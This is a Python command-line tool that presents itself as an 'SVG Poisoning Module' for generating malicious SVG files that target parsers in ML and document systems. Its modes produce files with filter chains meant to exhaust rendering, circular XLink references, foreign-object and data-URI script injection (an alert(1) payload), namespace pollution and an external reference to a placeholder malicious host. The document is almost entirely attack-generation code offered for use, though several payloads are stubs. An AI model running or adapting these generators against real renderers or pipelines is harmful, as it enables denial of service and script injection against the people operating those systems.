#!/usr/bin/env python3
"""
📜 SVG Poisoning Module
Scalable Vector Graphics manipulation attacks

Author: frankSx <fixes.it.frank@googlesmail.com>
13th Hour Research Division

Targets SVG parsers in ML systems, including:
- Document understanding models
- Icon/logo recognition systems
- Vector graphics classifiers
"""

import argparse
import random
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Tuple


class SVGPoisoner:
    """Generate poisoned SVG files"""

    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)
        self.namespaces = {
            'svg': 'http://www.w3.org/2000/svg',
            'xlink': 'http://www.w3.org/1999/xlink',
            'custom': 'http://ghostbyte.local/poison'
        }

    def generate_gradient_confusion(self, 
                                   width: int = 500,
                                   height: int = 500,
                                   complexity: int = 100) -> str:
        """
        Generate SVG with confusing gradient definitions

        Exploits gradient parsing and rendering differences
        """
        svg_parts = [
            f'<svg width="{width}" height="{height}" xmlns="http://www.w3.org/2000/svg">',
            '<defs>'
        ]

        # Create many overlapping gradients
        for i in range(complexity):
            stops = []
            num_stops = random.randint(2, 10)
            for j in range(num_stops):
                offset = j / (num_stops - 1)
                color = f"hsl({(i * 10 + j * 30) % 360}, 100%, 50%)"
                stops.append(f'<stop offset="{offset:.2f}" stop-color="{color}"/>')

            gradient_type = random.choice(['linearGradient', 'radialGradient'])
            gradient_id = f"poison-grad-{i}"

            if gradient_type == 'linearGradient':
                x1, y1 = random.random(), random.random()
                x2, y2 = random.random(), random.random()
                svg_parts.append(
                    f'<{gradient_type} id="{gradient_id}" '
                    f'x1="{x1:.2f}%" y1="{y1:.2f}%" x2="{x2:.2f}%" y2="{y2:.2f}%">'
                )
            else:
                cx, cy = random.random(), random.random()
                r = random.random()
                svg_parts.append(
                    f'<{gradient_type} id="{gradient_id}" '
                    f'cx="{cx:.2f}%" cy="{cy:.2f}%" r="{r:.2f}%">'
                )

            svg_parts.extend(stops)
            svg_parts.append(f'</{gradient_type}>')

        # Create shapes using these gradients
        for i in range(complexity):
            x = random.randint(0, width - 50)
            y = random.randint(0, height - 50)
            w = random.randint(20, 100)
            h = random.randint(20, 100)
            grad_id = f"poison-grad-{i}"
            opacity = random.random()

            svg_parts.append(
                f'<rect x="{x}" y="{y}" width="{w}" height="{h}" '
                f'fill="url(#{grad_id})" opacity="{opacity:.2f}"/>'
            )

        svg_parts.append('</svg>')
        return '\n'.join(svg_parts)

    def generate_path_confusion(self,
                               width: int = 500,
                               height: int = 500,
                               paths: int = 50) -> str:
        """
        Generate SVG with path data designed to confuse parsers

        Uses complex curves, self-intersections, and degenerate paths.
        """
        svg_parts = [
            f'<svg width="{width}" height="{height}" xmlns="http://www.w3.org/2000/svg">',
            '<rect width="100%" height="100%" fill="white"/>'
        ]

        for i in range(paths):
            # Generate complex path data
            commands = ['M']
            points = []

            # Start point
            x, y = random.randint(0, width), random.randint(0, height)
            points.append(f"{x},{y}")

            # Add complex curves
            for _ in range(random.randint(5, 20)):
                cmd = random.choice(['L', 'C', 'Q', 'T', 'S'])
                if cmd == 'L':
                    x, y = random.randint(0, width), random.randint(0, height)
                    points.append(f"{cmd}{x},{y}")
                elif cmd == 'C':
                    # Cubic bezier
                    coords = []
                    for _ in range(3):
                        coords.append(f"{random.randint(0, width)},{random.randint(0, height)}")
                    points.append(f"{cmd}{' '.join(coords)}")
                elif cmd == 'Q':
                    # Quadratic bezier
                    coords = []
                    for _ in range(2):
                        coords.append(f"{random.randint(0, width)},{random.randint(0, height)}")
                    points.append(f"{cmd}{' '.join(coords)}")

            # Close path or leave open randomly
            if random.random() > 0.5:
                points.append('Z')

            path_data = ' '.join(points)
            stroke = f"hsl({random.randint(0, 360)}, 100%, 50%)"
            fill = "none" if random.random() > 0.5 else f"hsl({random.randint(0, 360)}, 50%, 50%)"
            stroke_width = random.randint(1, 5)

            svg_parts.append(
                f'<path d="{path_data}" stroke="{stroke}" fill="{fill}" '
                f'stroke-width="{stroke_width}" opacity="0.7"/>'
            )

        svg_parts.append('</svg>')
        return '\n'.join(svg_parts)

    def generate_namespace_pollution(self,
                                    width: int = 500,
                                    height: int = 500) -> str:
        """
        Generate SVG with namespace confusion

        Adds custom namespaces and foreign objects that may
        confuse XML parsers or security scanners.
        """
        svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg width="{width}" height="{height}"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     xmlns:custom="http://ghostbyte.local/poison"
     xmlns:evil="http://attack.local/evil"
     custom:payload="MALICIOUS"
     evil:trigger="true">

    <defs>
        <!-- Entity-like definitions that may confuse parsers -->
        <custom:definition id="confuse1">
            <custom:nested depth="100">
                <custom:data>XXXX</custom:data>
            </custom:nested>
        </custom:definition>

        <!-- Foreign object injection -->
        <foreignObject x="0" y="0" width="100%" height="100%">
            <div xmlns="http://www.w3.org/1999/xhtml">
                <script>/* Potential script confusion */</script>
                <style>body{{display:none}}</style>
            </div>
        </foreignObject>
    </defs>

    <!-- Visual content -->
    <rect width="100%" height="100%" fill="lightblue"/>

    <!-- Entity reference-like strings -->
    <text x="50%" y="50%" text-anchor="middle">
        &amp;amp; &amp;lt; &amp;gt; &amp;#x41; &amp;#65;
    </text>

    <!-- Nested SVG with different coordinate systems -->
    <svg x="10%" y="10%" width="80%" height="80%" viewBox="0 0 100 100">
        <rect width="100" height="100" fill="coral"/>
        <svg x="10" y="10" width="80" height="80" viewBox="0 0 50 50">
            <rect width="50" height="50" fill="gold"/>
        </svg>
    </svg>

    <!-- XLink confusion -->
    <use xlink:href="#confuse1" x="0" y="0"/>

</svg>'''
        return svg

    def generate_filter_poison(self,
                              width: int = 500,
                              height: int = 500) -> str:
        """
        Generate SVG with complex filter chains

        Creates computationally expensive filters that may
        cause DoS or rendering confusion.
        """
        svg_parts = [
            f'<svg width="{width}" height="{height}" xmlns="http://www.w3.org/2000/svg">',
            '<defs>',
            '<filter id="poison-filter" x="-50%" y="-50%" width="200%" height="200%">'
        ]

        # Chain many filter primitives
        filter_primitives = [
            '<feGaussianBlur stdDeviation="5" result="blur"/>',
            '<feColorMatrix in="blur" type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7" result="goo"/>',
            '<feTurbulence type="fractalNoise" baseFrequency="0.03" numOctaves="5" result="noise"/>',
            '<feDisplacementMap in="SourceGraphic" in2="noise" scale="50" xChannelSelector="R" yChannelSelector="G"/>',
            '<feSpecularLighting surfaceScale="5" specularConstant="1" specularExponent="20" lighting-color="#white" result="spec">',
            '    <fePointLight x="-5000" y="-10000" z="20000"/>',
            '</feSpecularLighting>',
            '<feComposite in="spec" in2="SourceAlpha" operator="in" result="specOut"/>',
            '<feComposite in="SourceGraphic" in2="specOut" operator="arithmetic" k1="0" k2="1" k3="1" k4="0"/>',
            '<feConvolveMatrix order="3" kernelMatrix="0 -1 0 -1 5 -1 0 -1 0"/>',
            '<feMorphology operator="dilate" radius="3"/>',
        ]

        # Repeat filters for exhaustion
        for _ in range(3):
            svg_parts.extend(filter_primitives)

        svg_parts.extend([
            '</filter>',
            '</defs>',
            f'<rect width="{width}" height="{height}" fill="navy"/>',
            f'<rect width="{width}" height="{height}" fill="orange" filter="url(#poison-filter)"/>',
            '</svg>'
        ])

        return '\n'.join(svg_parts)

    def generate_animation_poison(self,
                                 width: int = 500,
                                 height: int = 500) -> str:
        """
        Generate SVG with SMIL animation confusion

        Uses complex animation timing and interpolation
        to confuse temporal analysis.
        """
        svg_parts = [
            f'<svg width="{width}" height="{height}" xmlns="http://www.w3.org/2000/svg">',
            '<rect width="100%" height="100%" fill="black"/>'
        ]

        # Create many animated elements
        for i in range(20):
            x = random.randint(0, width - 50)
            y = random.randint(0, height - 50)
            size = random.randint(10, 50)
            color = f"hsl({i * 18}, 100%, 50%)"

            svg_parts.append(f'''<circle cx="{x}" cy="{y}" r="{size}" fill="{color}">
    <animate attributeName="cx" 
        values="{x};{width-x};{x}" 
        dur="{0.5 + random.random()}s" 
        repeatCount="indefinite"
        calcMode="spline"
        keySplines="0.4 0 0.2 1; 0.4 0 0.2 1"/>
    <animate attributeName="cy" 
        values="{y};{height-y};{y}" 
        dur="{0.7 + random.random()}s" 
        repeatCount="indefinite"/>
    <animate attributeName="r" 
        values="{size};{size*2};{size}" 
        dur="{0.3 + random.random()}s" 
        repeatCount="indefinite"/>
    <animate attributeName="opacity" 
        values="1;0;1" 
        dur="{0.2 + random.random() * 0.3}s" 
        repeatCount="indefinite"/>
</circle>''')

        svg_parts.append('</svg>')
        return '\n'.join(svg_parts)

    def generate_xlink_confusion(self, 
                                width: int = 500, 
                                height: int = 500) -> str:
        """Generate SVG with XLink reference confusion"""
        svg = f'''<svg width="{width}" height="{height}" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <defs>
        <!-- Circular reference attempt -->
        <g id="a">
            <use xlink:href="#b"/>
        </g>
        <g id="b">
            <use xlink:href="#a"/>
        </g>

        <!-- Deeply nested references -->
        <g id="level1">
            <g id="level2">
                <g id="level3">
                    <rect width="50" height="50" fill="red"/>
                </g>
            </g>
        </g>

        <!-- External reference (broken intentionally) -->
        <use id="external" xlink:href="http://ghostbyte.local/malicious.svg#payload"/>
    </defs>

    <!-- Multiple use references -->
    <use xlink:href="#level1"/>
    <use xlink:href="#level2"/>
    <use xlink:href="#level3"/>

    <!-- Data URI confusion -->
    <image xlink:href="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;" 
           width="100" height="100"/>

    <!-- Base64 encoded inline -->
    <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiBmaWxsPSJyZWQiLz48L3N2Zz4=" 
           x="100" y="100" width="100" height="100"/>
</svg>'''
        return svg


def main():
    parser = argparse.ArgumentParser(description='📜 GHOSTBYTE SVG Poison Generator')
    parser.add_argument('--mode',
                       choices=['gradient', 'path', 'namespace', 'filter', 'animation', 'xlink'],
                       required=True)
    parser.add_argument('--output', '-o', default='poisoned.svg')
    parser.add_argument('--width', type=int, default=500)
    parser.add_argument('--height', type=int, default=500)
    parser.add_argument('--complexity', type=int, default=100)
    parser.add_argument('--seed', type=int)

    args = parser.parse_args()

    poisoner = SVGPoisoner(seed=args.seed)

    if args.mode == 'gradient':
        result = poisoner.generate_gradient_confusion(
            args.width, args.height, args.complexity
        )
    elif args.mode == 'path':
        result = poisoner.generate_path_confusion(
            args.width, args.height, args.complexity // 2
        )
    elif args.mode == 'namespace':
        result = poisoner.generate_namespace_pollution(args.width, args.height)
    elif args.mode == 'filter':
        result = poisoner.generate_filter_poison(args.width, args.height)
    elif args.mode == 'animation':
        result = poisoner.generate_animation_poison(args.width, args.height)
    elif args.mode == 'xlink':
        result = poisoner.generate_xlink_confusion(args.width, args.height)

    with open(args.output, 'w', encoding='utf-8') as f:
        f.write(result)

    print(f"📜 SVG poison generated: {args.output}")
    print(f"   Mode: {args.mode}")
    print(f"   Size: {args.width}x{args.height}")


if __name__ == '__main__':
    main()
